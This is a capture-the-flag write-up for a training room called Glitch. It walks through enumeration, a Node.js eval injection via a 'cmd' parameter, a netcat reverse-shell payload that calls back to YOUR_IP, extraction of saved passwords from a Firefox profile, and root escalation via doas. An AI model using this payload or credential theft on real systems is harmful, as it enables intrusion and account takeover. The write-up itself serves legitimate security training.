# [GLITCH](https://tryhackme.com/room/glitch)

First as always, `nmap`

```
# Nmap 7.91 scan initiated Mon Jul 26 08:20:14 2021 as: nmap -vvv -p 80 -sCV -oN nmap 10.10.180.174
Nmap scan report for box.ip (10.10.180.174)
Host is up, received syn-ack (0.23s latency).
Scanned at 2021-07-26 08:20:14 UTC for 22s

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: not allowed
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jul 26 08:20:36 2021 -- 1 IP address (1 host up) scanned in 22.35 seconds
```

We only have a web service on port 80. Looking at the page, it's just a static page with an image. However, if we look at the source code, we can see the function `getAccess()` declared but not run. If we run it in the developer console, we get a base64-encoded string which when decoded gives us an access token. Looking at the cookies for the page, we have a cookie named "token". If we put the access token here and refresh, we should get a different page.

Since we had the api endpoint `/api/access` earlier in the source code, let's try finding other endpoints with `gobuster`.

```sh
$ gobuster dir -u 'http://box.ip/api/' -w ~/tools/SecLists/Discovery/Web-Content/api/objects.txt  -t 100 -r -o api

/access               (Status: 200) [Size: 36]
/items                (Status: 200) [Size: 169]
```

Checking `/api/items`, a GET requests gives us some json that doesn't seem to mean much at this point.

```sh
$ curl -X GET http://box.ip/api/items
{"sins":["lust","gluttony","greed","sloth","wrath","envy","pride"],"errors":["error","error","error","error","error","error","error","error","error"],"deaths":["death"]}
```

A POST request also just gives a strange message.

```sh
$ curl -X POST http://box.ip/api/items
{"message":"there_is_a_glitch_in_the_matrix"}
```

Fuzzing URL parameters for POST requests ...

```sh
$ ffuf -X POST -u 'http://box.ip/api/items?FUZZ=test' -w ~/tools/SecLists/Discovery/Web-Content/api/objects.txt -mc all -fs 45
[snip]
cmd                     [Status: 500, Size: 1081, Words: 55, Lines: 11, Duration: 215ms]
```

... gives us the parameter `cmd`. Making a requests with `cmd=test` gives us a 500 response saying "test us not defined", and we can also see that `eval` is used to execute whatever is given to `cmd`, as well as that this is a Node application.

```
ReferenceError: test is not defined<br> &nbsp; &nbsp;at eval (eval at router.post (/var/web/routes/api.js:25:60), &lt;anonymous&gt;:1:1)<br> &nbsp; &nbsp;at router.post (/var/web/routes/api.js:25:60)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/var/web/node_modules/express/lib/router/route.js:137:13)<br> &nbsp; &nbsp;at Route.dispatch (/var/web/node_modules/express/lib/router/route.js:112:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/var/web/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /var/web/node_modules/express/lib/router/index.js:281:22<br> &nbsp; &nbsp;at Function.process_params (/var/web/node_modules/express/lib/router/index.js:335:12)<br> &nbsp; &nbsp;at next (/var/web/node_modules/express/lib/router/index.js:275:10)<br> &nbsp; &nbsp;at Function.handle (/var/web/node_modules/express/lib/router/index.js:174:3)
```

Since we have Remote Code Execution (RCE), we can get a reverse shell with the following payload as the value for `cmd`:

```js
require("child_process").exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 1337 >/tmp/f")"
```

With this, we should have a shell as `user`. Looking at our home directory, there's the directory `.firefox` with 777 permissions, which is odd, so we'll copy it to our local machine.

Inside the `.firefox` directory is a firefox profile `b5w4643p.default-release`. We can open it with firefox.

```sh
firefox -profile .firefox/b5w4643p.default-release/
```

In firefox, we can see v0id's credentials at `about:logins`. With the found credentials, we can become the `v0id` user with `su v0id`.

At this point, I ran [linpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) and found that we have `doas`, an alternative to `sudo`. Since we have v0id's password, we can easily get a shell as root.

```sh
doas bash
```

With that, we should now have a root shell.
